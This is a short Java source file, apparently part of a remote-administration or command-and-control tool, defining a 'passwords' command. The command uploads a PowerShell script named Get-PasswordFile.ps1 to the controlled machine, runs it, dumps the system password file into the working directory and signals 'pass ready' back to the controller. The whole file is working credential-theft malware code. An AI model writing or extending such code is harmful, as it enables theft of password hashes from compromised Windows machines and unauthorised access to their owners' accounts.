package commands;

import java.io.IOException;

import connection.Controller;

public class PasswordsCommand extends Command{

	public PasswordsCommand() {
		super("passwords");
	}

	@Override
	public void execute(Controller ctrl) throws IOException {
		ctrl.receiveFile("Get-PasswordFile.ps1");
		ctrl.executeScript("Get-PasswordFile.ps1");
		String path = ctrl.execute("Get-Location");
		path = path.split("\n")[3];
		path = path + "\\";
		path = path.replace("[", "`[");
		path = path.replace("]", "`]");
		System.out.println(ctrl.execute("Get-PasswordFile -DestinationPath " + path));
		ctrl.sendMsg("pass ready");
	}

}
